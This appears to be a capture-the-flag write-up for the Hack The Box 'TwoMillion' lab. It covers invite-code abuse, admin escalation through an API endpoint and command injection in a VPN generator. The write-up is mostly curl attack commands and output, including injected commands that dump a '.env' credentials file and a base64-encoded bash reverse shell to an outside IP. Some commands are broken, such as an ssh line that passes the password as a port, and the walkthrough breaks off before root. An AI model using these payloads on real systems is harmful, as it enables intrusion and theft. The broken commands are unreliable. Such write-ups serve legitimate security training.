# TwoMillion

TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.

- **Difficulty:** Easy
- **OS:** Linux

[TwoMillion](https://app.hackthebox.com/machines/TwoMillion)

## `nmap`

We will begin by enumerating open services using `nmap`. 
We will find that there is a web server running on port 80. 

```bash
Nmap scan report for 2million.htb (10.10.11.221)
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx 
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-title: Hack The Box :: Penetration Testing Labs
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.55 seconds
```

The web server can be accessed by visiting `http:/2million.htb/` after adding the IP and Hostname to the `/etc/hosts` file.
This is the first version of the Hack The Box platform !

## `JavaScript`

With DevTools, we can see that the website is using `JavaScript` to display the content.
One of the script is `inviteapi.min.js`. Its content is obfuscated as follows.

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

We can deobfuscate the script using https://lelinhtinh.github.io/de4js/.

```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

We can see that the website is using an API to verify and generate invite codes.

## `API`

We can use the `makeInviteCode` function to verify an invite code.

```bash
curl -X POST http://2million.htb/api/v1/invite/how/to/generate
```

> The answer is a Rot13 encoded string. After decoding it, we get how to generate an invite code.

```bash
curl -sX POST http://2million.htb/api/v1/invite/generate | grep "code" | cut -d '"' -f4 | base64 -d
```

We now have an invite code ! Let's create an account on the website.

## `Account`

As we now have a user account, we can log in to the website and see the content.
Let's see "Access" page ! It is the way to download the VPN configuration file.
If we inspect the page, we can see how the button "Connection Pack" is generated.

```html
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://2million.htb/home/access
DNT: 1
Connection: close
Cookie: PHPSESSID=nufb0km8892s1t9kraqhqiecj6
Upgrade-Insecure-Requests: 1
```

> We can see that the VPN configuration file is generated using the `/api/v1/user/vpn/generate` endpoint.

Let's enumerate the API to see if we can find any vulnerabilities.

```bash
curl 2million.htb/api/v1 --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" | jq
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

We can find 10 functions of the API. Let's see if we can find any vulnerabilities.

## `API Vulnerabilities`

```bash
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6"
{
    "message":  false
}
```

> We are not an admin ! Let's try to make our account an admin account.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" | jq
{
    "status": "danger",
    "message: Missing parameter: email"
}

It seems that the API is vulnerable, let's try to get admin access.

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"email":"email@domain.com", "is_admin":'1'}' | jq
{
    "id":24,
    "username":"big_couilles",
    "is_admin":1
}
```

> We are now an admin ! Let's see what we can do next.

## `Admin Access`

```bash
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6"
{
    "message":  true
}
```

We can now tickle that /api/v1/admin/vpn/generate endpoint.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test"}' | jq
```

> It indeed generates a VPN configuration file for the user `test`. 

If this VPN is being generated via the exec or system PHP function and there is insufficient filtering in place - which is possible as this is an administrative only function - 
it might be possible to inject malicious code in the username field and gain command execution on the remote system.
Let's test this assumption by injecting the command ;ls -laF; after the username.

> There is a `.env` file ! Secrets and critical information, here we come !

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test;cat .env;"}' | jq
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

## User Flag

Now that we now that this endpoint is vulnerable to command injection, we can use it to get a reverse shell.

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=nufb0km8892s1t9kraqhqiecj6" --header "Content-Type: application/json" --data '{"username":"test;echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTAvMTIzNCAwPiYxCg==' | base64 -d | bash;"}' | jq
```

Otherwise, we can directly connect to host with :

```bash
ssh admin@2million -p SuperDuperPass123
cat user.txt
```

## Root Flag

We now have to elevate our privileges to root. Let's see what we can do. You can search for files or folders. Our way will be to search for mails.

```bash
cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

> We can see that the admin is working on a DB migration and that the OS needs to be upgraded. We can use this information to escalate our privileges.

```bash
uname -r
```

